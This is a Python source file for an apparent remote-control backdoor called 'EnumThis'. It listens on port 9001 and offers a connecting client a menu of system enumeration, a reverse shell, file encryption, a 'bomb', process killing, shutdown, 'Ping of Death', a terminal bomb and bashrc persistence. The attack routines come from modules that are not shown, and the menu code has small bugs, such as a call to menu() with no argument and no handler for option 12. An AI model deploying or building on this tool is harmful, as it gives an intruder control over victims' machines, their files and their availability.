#!/bin/env python3
import socket
import sys
from terminalBomb import *
from sysctrl import *
from prockill import *
from procEnum import *
from sysEnum import *
from osEnum import *
from network import *
from files import * 
from usage import *
from dropshell import *
from encrypting import *
from bomb import *
from persistent import *
host = '0.0.0.0'
port = 9001 

cyan  = "\033[0;96m"
green   = "\033[0;92m"
white   = "\033[0;97m"
red   = "\033[0;91m"
blue  = "\033[0;94m"
yellow  = "\033[0;33m"
magenta = "\033[0;35m"
Color_Off='\033[0m'

def banner(con):
    banner = magenta + """ 
    8888888888                             88888888888 888    888 d8b          
    888                                        888     888    888 Y8P""" + Color_Off
    banner += yellow + """
    888                                        888     888    888              
    8888888    88888b.  888  888 88888b.d88b.  888     8888888888 888 .d8888b""" + Color_Off
    banner += blue + """
    888        888 "88b 888  888 888 "888 "88b 888     888    888 888 88K      
    888        888  888 888  888 888  888  888 888     888    888 888 "Y8888b.""" + Color_Off
    banner += red + """ 
    888        888  888 Y88b 888 888  888  888 888     888    888 888      X88 
    8888888888 888  888  "Y88888 888  888  888 888     888    888 888  88888P'""" + Color_Off
    con.sendall(banner.encode())


def menu(con):
    banner(con)
    mainMenu = b'\n\nChoose What To Retrieve!\n1. OS Information\n2. System Information\n3. Process Information\n4. Network Information\n5. File and Directory\n6. Hardware Usage\n7. Execute Reverse Shell\n8. Encrypt File\n9. Drop Bomb\n10. Kill Process\n11. Shutdown/Restart\n12. Ping of Death\n13. Terminal Bomb\n14. Run persistent\n15. Limited Shell'
    con.sendall(mainMenu)
    con.sendall(b'\nSpecify Option: ')
    opt = con.recv(1024)
    if not opt:
        menu()
    else :
        try:
            opt = opt.decode()
            opt = int(opt)
            if(opt == 1):
                osMenu(con)
            elif(opt == 2):
                sysMenu(con)
            elif(opt == 3):
                procMenu(con)
            elif(opt == 4):
                NetworkMenu(con)
            elif(opt == 5):
                filesMenu(con)
            elif(opt == 6):
                UsageMenu(con)
            elif(opt == 7):
                dropRevShell(con)
            elif(opt == 8):
                encryptMenu(con)
            elif(opt == 9):
                launchBomb(con)
            elif(opt == 10):
                killProcess(con)
            elif(opt == 11):
                sysControl(con)
            elif(opt == 13):
                termBomb(con)
            elif(opt ==14):
                con.sendall(b"ONLY WOKRS ON LINUX!")
                add2bashrc()
                con.sendall(b"DONE!")
            elif(opt ==15):
                limitedShell(con)
        except ValueError:
            con.sendall(b'Please only send integer value representing each option\n')
        except KeyboardInterrupt:
            sys.exit(0)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            s.listen()
            conn, addr = s.accept()
            with conn:
                print('Connection from ',addr)
                while True:
                    menu(conn)
        except KeyboardInterrupt:
            print("Keyboard Interrupt")
            sys.exit(0)
        except :
            print('Cant Bind Socket')


if __name__ == "__main__":
    while True:
        main()


